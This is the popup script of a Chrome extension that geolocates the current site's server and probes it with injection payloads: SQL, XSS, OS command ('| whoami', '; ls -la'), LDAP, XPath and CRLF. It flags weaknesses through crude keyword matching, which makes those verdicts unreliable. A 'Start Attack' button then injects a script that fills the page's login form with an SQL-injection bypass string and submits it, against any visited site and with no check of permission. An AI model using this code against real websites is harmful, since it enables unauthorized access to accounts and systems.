// Event listener for the "Scan Website" button
document.getElementById("scanButton").addEventListener("click", async () => {
  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
  const url = new URL(tab.url);

  console.log("Scanning website:", url.hostname);

  const loadingSpinner = document.getElementById("loading");
  const outputDiv = document.getElementById("output");

  // Show loading spinner
  loadingSpinner.style.display = "block";
  outputDiv.innerHTML = ""; // Clear previous output

  try {
    const response = await fetch(`http://ip-api.com/json/${url.hostname}`);
    const data = await response.json();

    console.log("API Response:", data);

    // Hide spinner
    loadingSpinner.style.display = "none";

    if (data.status === "success") {
      outputDiv.style.borderColor = "green";
      outputDiv.innerHTML = `
        <p><strong>🌐 IP:</strong> ${data.query}</p>
        <p><strong>🏙️ City:</strong> ${data.city || "Not available"}</p>
        <p><strong>🗺️ Region:</strong> ${data.regionName || "Not available"}</p>
        <p><strong>🇺🇸 Country:</strong> ${data.country || "Not available"}</p>
        <p><strong>💻 ISP:</strong> ${data.isp || "Not available"}</p>
      `;
    } else {
      outputDiv.style.borderColor = "red";
      outputDiv.innerHTML = `<p>❌ Failed to fetch server information.</p>`;
    }
  } catch (error) {
    console.error("Error fetching data:", error);
    loadingSpinner.style.display = "none"; // Hide spinner
    outputDiv.style.borderColor = "red";
    outputDiv.innerHTML = `<p>❌ Error occurred while fetching data.</p>`;
  }
});

// Event listener for the "Check for Injection Vulnerabilities" button
document.getElementById("injectionCheckButton").addEventListener("click", async () => {
  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
  const url = new URL(tab.url);

  console.log("Checking for injection vulnerabilities:", url.hostname);

  const loadingSpinner = document.getElementById("loading");
  const outputDiv = document.getElementById("output");

  // Show loading spinner
  loadingSpinner.style.display = "block";
  outputDiv.innerHTML = ""; // Clear previous output

  try {
    // Array to store detected vulnerabilities
    const vulnerabilities = [];

    // Test for CWE-89: SQL Injection
    const sqlInjectionPayload = "username=admin&password=1234' OR '1'='1";
    const sqlResponse = await fetch(url.href, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: sqlInjectionPayload,
    });
    const sqlText = await sqlResponse.text();
    if (sqlText.includes("error") || sqlText.includes("SQL syntax")) {
      vulnerabilities.push("CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')");
    }

    // Test for CWE-79: Cross-Site Scripting (XSS)
    const xssPayload = "<script>alert('XSS')</script>";
    const xssResponse = await fetch(url.href, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `username=admin&comment=${encodeURIComponent(xssPayload)}`,
    });
    const xssText = await xssResponse.text();
    if (xssText.includes(xssPayload)) {
      vulnerabilities.push("CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')");
    }

    // Test for CWE-77: Command Injection
    const commandInjectionPayload = "; ls -la";
    const commandResponse = await fetch(url.href, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `username=admin&command=${encodeURIComponent(commandInjectionPayload)}`,
    });
    const commandText = await commandResponse.text();
    if (commandText.includes("bin") || commandText.includes("etc")) {
      vulnerabilities.push("CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')");
    }

    // Test for CWE-78: OS Command Injection
    const osCommandInjectionPayload = "| whoami";
    const osCommandResponse = await fetch(url.href, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `username=admin&command=${encodeURIComponent(osCommandInjectionPayload)}`,
    });
    const osCommandText = await osCommandResponse.text();
    if (osCommandText.includes("root") || osCommandText.includes("user")) {
      vulnerabilities.push("CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')");
    }

    // Test for CWE-90: LDAP Injection
    const ldapInjectionPayload = "*)(uid=*))(|(uid=*";
    const ldapResponse = await fetch(url.href, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `username=${encodeURIComponent(ldapInjectionPayload)}&password=1234`,
    });
    const ldapText = await ldapResponse.text();
    if (ldapText.includes("error") || ldapText.includes("LDAP")) {
      vulnerabilities.push("CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')");
    }

    // Test for CWE-91: XML Injection (Blind XPath Injection)
    const xmlInjectionPayload = "' or '1'='1";
    const xmlResponse = await fetch(url.href, {
      method: 'POST',
      headers: { 'Content-Type': 'application/xml' },
      body: `<user><username>${xmlInjectionPayload}</username><password>1234</password></user>`,
    });
    const xmlText = await xmlResponse.text();
    if (xmlText.includes("error") || xmlText.includes("XPath")) {
      vulnerabilities.push("CWE-91: XML Injection (aka Blind XPath Injection)");
    }

    // Test for CWE-113: HTTP Response Splitting
    const httpResponseSplittingPayload = "%0d%0aSet-Cookie: injected=value";
    const httpResponseSplittingResponse = await fetch(url.href, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `username=admin${httpResponseSplittingPayload}`,
    });
    const httpResponseSplittingText = await httpResponseSplittingResponse.text();
    if (httpResponseSplittingText.includes("injected=value")) {
      vulnerabilities.push("CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')");
    }

    // Test for CWE-643: XPath Injection
    const xpathInjectionPayload = "' or '1'='1";
    const xpathResponse = await fetch(url.href, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `username=${encodeURIComponent(xpathInjectionPayload)}&password=1234`,
    });
    const xpathText = await xpathResponse.text();
    if (xpathText.includes("error") || xpathText.includes("XPath")) {
      vulnerabilities.push("CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')");
    }

    // Hide spinner
    loadingSpinner.style.display = "none";

    // Display results
    if (vulnerabilities.length > 0) {
      outputDiv.style.borderColor = "red";
      outputDiv.innerHTML = `
        ⚠️ Potential injection vulnerabilities detected!
        <br>
        Vulnerabilities:
        <ul>
          ${vulnerabilities.map((vuln) => `<li>${vuln}</li>`).join("")}
        </ul>
      `;
      outputDiv.innerHTML += `<button id="startAttackButton">Start Attack</button>`;

      // Add event listener to the Start Attack button
      document.getElementById("startAttackButton").addEventListener("click", () => {
        // Perform the SQL injection attack when the "Start Attack" button is clicked
        startSQLInjectionAttack(tab.id);
      });

    } else {
      outputDiv.style.borderColor = "green";
      outputDiv.innerHTML = `✅ No injection vulnerabilities detected.`;
    }
  } catch (error) {
    console.error("Error checking for vulnerabilities:", error);
    loadingSpinner.style.display = "none"; // Hide spinner
    outputDiv.style.borderColor = "red";
    outputDiv.innerHTML = `❌ Error occurred while checking for vulnerabilities.`;
  }
});

// Event listener for the "Help" button
document.getElementById("helpButton").addEventListener("click", () => {
  chrome.tabs.create({ url: "https://www.example.com/help" }); // Replace with your desired URL
});

// Function to start the SQL injection attack when the button is pressed
function startSQLInjectionAttack(tabId) {
  const sqlInjectionPayload = "1' OR '1'='1"; // The payload to inject
  chrome.scripting.executeScript({
    target: { tabId: tabId },
    func: fillSQLInjection,
    args: [sqlInjectionPayload]
  });
}

// Function to fill the login form with SQL injection payload
function fillSQLInjection(payload) {
  const usernameField = document.querySelector("input[name='username']");
  const passwordField = document.querySelector("input[name='password']");
  
  if (usernameField && passwordField) {
    usernameField.value = payload;
    passwordField.value = payload;

    // Optionally, submit the form automatically
    const form = document.querySelector("form");
    if (form) {
      form.submit();
    }
  }
}
